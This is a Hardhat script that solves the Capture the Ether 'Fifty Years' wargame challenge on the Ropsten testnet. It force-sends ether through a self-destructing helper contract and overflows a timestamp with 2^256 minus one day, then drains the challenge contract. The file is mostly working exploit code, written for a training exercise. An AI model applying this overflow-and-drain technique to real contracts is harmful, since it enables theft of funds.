const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");

async function main() {
    const abi = [
        {"constant": false, "inputs": [{"name": "index", "type": "uint256"}], "name": "withdraw", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function"},
        {"constant": false, "inputs": [{"name": "index", "type": "uint256"}, {"name": "timestamp", "type": "uint256"}], "name": "upsert", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function"},
        {"constant": true, "inputs": [], "name": "isComplete", "outputs": [{"name": "", "type": "bool"}], "payable": false, "stateMutability": "view", "type": "function"},
        {"inputs": [{"name": "player", "type": "address"}], "payable": true, "stateMutability": "payable", "type": "constructor"}
    ];

    //The contract address - Just copy it from the CTE challenge page
    const contractAddress = ethers.utils.getAddress("0x91Efe024ad7476A147328201Ff9aD093ca495819");

    /* 
    * To solve the challenge, you need to use your ropsten account, as CTE is expecting that account address.
    * To that effect, you need to export your private key from metamask and place it in the hardhat.config.js - the template is already there.
    * Then, we can get your wallet as the signer. The console.log should print your ropsten account address.
    */
    const [signer] = await ethers.getSigners();
    console.log("SIGNER: ", signer.address)


    /* 
    * First, we deploy our helper contract.
    * We won't kill it immediately because later we'll need to wait for the transaction before withdrawing.
    */ 
    console.log("Deploying contract with the account:", signer.address);
    const FiftyYearsHelperContractFactory = await ethers.getContractFactory("FiftyYearsHelper");
    const FiftyYearsHelperContract = await FiftyYearsHelperContractFactory.deploy({value: 2});
    console.log("Fifty Years Helper Contract Deployed at: ", FiftyYearsHelperContract.address);
    console.log("------------------------------------------------------------------");

    //Then, we get the CTE challenge contract and connect using your account
    let cteContract = new ethers.Contract(contractAddress, abi, signer);

    //Now, let's determine the timestamp we need to pass to the first upsert call in order to prepare the overflow
    const dailySeconds = 24 * 60 * 60;
    const maxTimestamp = BigNumber.from(2).pow(256).sub(dailySeconds);
    let firstContributionTx = await cteContract.upsert(1, maxTimestamp, {value: 1 });
    let firstContributionTxReceipt = await firstContributionTx.wait();
    console.log("First contribution made: ", firstContributionTxReceipt);
    console.log("------------------------------------------------------------------");

    //It's time for the second contribution so we can reset the head to 0
    let secondContributionTx = await cteContract.upsert(2, 0, {value: 2 });
    let secondContributionTxReceipt = await secondContributionTx.wait();
    console.log("Second contribution made: ", secondContributionTxReceipt);
    console.log("------------------------------------------------------------------");

    //Now, we kill our helper contract
    let killTx = await FiftyYearsHelperContract.kill();
    let killTxReceipt = await killTx.wait();
    console.log("OUR CONTRACT HAS BEEN DESTROYED: ", killTxReceipt);
    console.log("------------------------------------------------------------------");

    //And now, we can call the withdraw function
    let withdrawTx = await cteContract.withdraw(2);
    let withdrawTxReceipt = await withdrawTx.wait();
    console.log("WE'VE DRAINED THE CHALLENGE CONTRACT: ", withdrawTxReceipt);
}

main()
.then(() => process.exit(0))
.catch((error) => {
    console.log(error);
    process.exit(1);
});